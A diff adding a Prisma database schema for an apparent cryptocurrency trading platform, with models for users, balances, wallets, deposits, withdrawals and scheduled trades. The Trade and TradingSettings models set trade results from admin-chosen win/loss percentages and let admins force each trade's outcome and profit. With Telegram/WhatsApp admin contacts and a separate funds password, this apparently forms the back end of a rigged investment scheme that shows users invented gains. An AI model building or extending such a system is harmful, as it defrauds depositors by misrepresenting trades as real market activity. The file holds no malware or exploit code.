@@ -1,0 +1,299 @@
+// This is your Prisma schema file,
+// learn more about it in the docs: https://pris.ly/d/prisma-schema
+
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+// User model for authentication and authorization
+model User {
+  id            String        @id @default(cuid())
+  email         String        @unique
+  password      String
+  fundsPassword String?
+  firstName     String
+  lastName      String
+  phoneNumber   String?
+  role          UserRole      @default(USER)
+  portfolio     Portfolio?
+  transactions  Transaction[]
+
+  forcePasswordReset Boolean   @default(false)
+  passwordUpdatedAt  DateTime?
+
+  // Trading related
+  balance       Float        @default(0)
+  totalInvested Float        @default(0)
+  totalEarnings Float        @default(0)
+  trades        Trade[]
+  userWallets   UserWallet[]
+
+  createdAt DateTime   @default(now())
+  updatedAt DateTime   @updatedAt
+  AuditLog  AuditLog[]
+
+  @@index([email])
+  @@index([phoneNumber])
+  @@index([role])
+}
+
+model AdminContact {
+  id        String   @id @default(cuid())
+  platform  String   @unique // 'telegram' or 'whatsapp'
+  value     String // Telegram username or WhatsApp number
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+}
+
+enum UserRole {
+  USER
+  ADMIN
+  SUPER_ADMIN
+}
+
+// Portfolio model for tracking user holdings
+model Portfolio {
+  id            String           @id @default(cuid())
+  userId        String           @unique
+  user          User             @relation(fields: [userId], references: [id], onDelete: Cascade)
+  totalValue    Float            @default(0)
+  totalInvested Float            @default(0)
+  totalPnL      Float            @default(0)
+  pnlPercentage Float            @default(0)
+  assets        PortfolioAsset[]
+  createdAt     DateTime         @default(now())
+  updatedAt     DateTime         @updatedAt
+
+  @@index([userId])
+}
+
+// Portfolio asset model for individual holdings
+model PortfolioAsset {
+  id                String    @id @default(cuid())
+  portfolioId       String
+  portfolio         Portfolio @relation(fields: [portfolioId], references: [id], onDelete: Cascade)
+  coinId            String // Coin ID from CoinGecko API
+  coinName          String
+  coinSymbol        String
+  quantity          Float
+  averageBuyPrice   Float
+  currentPrice      Float     @default(0)
+  totalBuyValue     Float     @default(0)
+  totalCurrentValue Float     @default(0)
+  pnl               Float     @default(0)
+  pnlPercentage     Float     @default(0)
+  createdAt         DateTime  @default(now())
+  updatedAt         DateTime  @updatedAt
+
+  @@unique([portfolioId, coinId])
+  @@index([portfolioId])
+  @@index([coinId])
+}
+
+// Transaction model for tracking all user transactions
+model Transaction {
+  id         String          @id @default(cuid())
+  userId     String
+  user       User            @relation(fields: [userId], references: [id], onDelete: Cascade)
+  coinId     String // Coin ID from CoinGecko API
+  coinName   String
+  coinSymbol String
+  type       TransactionType
+  quantity   Float
+  price      Float // Price per unit at the time of transaction
+  total      Float // Total transaction value (quantity * price)
+  fee        Float           @default(0)
+  notes      String?
+  createdAt  DateTime        @default(now())
+  updatedAt  DateTime        @updatedAt
+
+  @@index([userId])
+  @@index([coinId])
+  @@index([createdAt])
+}
+
+enum TransactionType {
+  BUY
+  SELL
+  DEPOSIT
+  WITHDRAWAL
+}
+
+// Crypto market data cache model
+model CryptoData {
+  id                String   @id @default(cuid())
+  coinId            String   @unique
+  name              String
+  symbol            String
+  currentPrice      Float
+  marketCap         Float?
+  volume24h         Float?
+  priceChange24h    Float?
+  priceChange7d     Float?
+  circulatingSupply Float?
+  maxSupply         Float?
+  cachedAt          DateTime @default(now())
+  updatedAt         DateTime @updatedAt
+
+  @@index([coinId])
+}
+
+// Admin audit log model
+model AuditLog {
+  id           String   @id @default(cuid())
+  adminId      String
+  action       String
+  targetUserId String?
+  entityType   String?
+  entityId     String?
+  changes      Json?
+  reason       String?
+  createdAt    DateTime @default(now())
+
+  // Just reference the userId, no back relation required
+  admin User @relation(fields: [adminId], references: [id])
+
+  @@index([adminId])
+  @@index([targetUserId])
+}
+
+// User crypto wallets for trading
+model UserWallet {
+  id     String @id @default(cuid())
+  userId String
+  user   User   @relation(fields: [userId], references: [id], onDelete: Cascade)
+
+  cryptoSymbol    String // BTC, ETH, etc
+  quantity        Float  @default(0)
+  averageBuyPrice Float  @default(0)
+  totalInvested   Float  @default(0)
+
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+
+  @@unique([userId, cryptoSymbol])
+  @@index([userId])
+}
+
+// Trade model with scheduling and admin control
+model Trade {
+  id     String @id @default(cuid())
+  userId String
+  user   User   @relation(fields: [userId], references: [id], onDelete: Cascade)
+
+  type         TradeType // BUY or SELL
+  cryptoSymbol String // BTC, ETH, etc
+  amountUSD    Float // Amount in USD
+  quantity     Float? // Calculated quantity
+
+  // Pricing
+  entryPrice Float? // Price when trade was placed
+  exitPrice  Float? // Price when trade executed
+
+  // Scheduling
+  scheduledTime DateTime // When trade should execute
+  executedAt    DateTime? // When trade actually executed
+
+  // Outcome control
+  status            TradeStatus   @default(SCHEDULED)
+  outcome           TradeOutcome? // WIN, LOSS, or NEUTRAL
+  profitLoss        Float? // Profit or loss amount
+  profitLossPercent Float? // P&L percentage
+
+  // Admin override
+  isForced         Boolean       @default(false)
+  forcedOutcome    TradeOutcome?
+  forcedProfitLoss Float?
+
+  // Metadata
+  notes     String?
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+
+  @@index([userId])
+  @@index([scheduledTime])
+  @@index([status])
+  @@index([cryptoSymbol])
+}
+
+enum TradeType {
+  BUY
+  SELL
+}
+
+enum TradeStatus {
+  SCHEDULED
+  EXECUTED
+  CANCELLED
+  FAILED
+}
+
+enum TradeOutcome {
+  WIN
+  LOSS
+  NEUTRAL
+}
+
+// Admin settings for trade outcomes
+model TradingSettings {
+  id String @id @default(cuid())
+
+  // Win/Loss control
+  winPercentage     Float @default(60) // 60% chance of winning
+  lossPercentage    Float @default(30) // 30% chance of losing
+  neutralPercentage Float @default(10) // 10% chance of neutral
+
+  // Random outcome toggle
+  useRandomOutcome Boolean @default(true)
+
+  // Price variation
+  priceVariation Float @default(2) // +/- 2% price variation
+
+  // Trading hours
+  tradingEnabled Boolean @default(true)
+  minTradeAmount Float   @default(10)
+  maxTradeAmount Float   @default(100000)
+
+  // Admin control
+  adminOverride Boolean @default(false) // Admin can override outcomes
+
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+}
+
+// Crypto price cache
+model CryptoPrice {
+  id             String @id @default(cuid())
+  symbol         String @unique
+  price          Float
+  marketCap      Float?
+  volume24h      Float?
+  priceChange24h Float?
+
+  lastUpdated DateTime @default(now())
+  updatedAt   DateTime @updatedAt
+
+  @@index([symbol])
+}
+
+// Trade execution log for debugging
+model TradeExecution {
+  id      String @id @default(cuid())
+  tradeId String
+
+  executionTime DateTime @default(now())
+  status        String // SUCCESS, FAILED, SCHEDULED
+  reason        String?
+
+  priceAtExecution  Float?
+  calculatedOutcome TradeOutcome?
+
+  createdAt DateTime @default(now())
+
+  @@index([tradeId])
+}
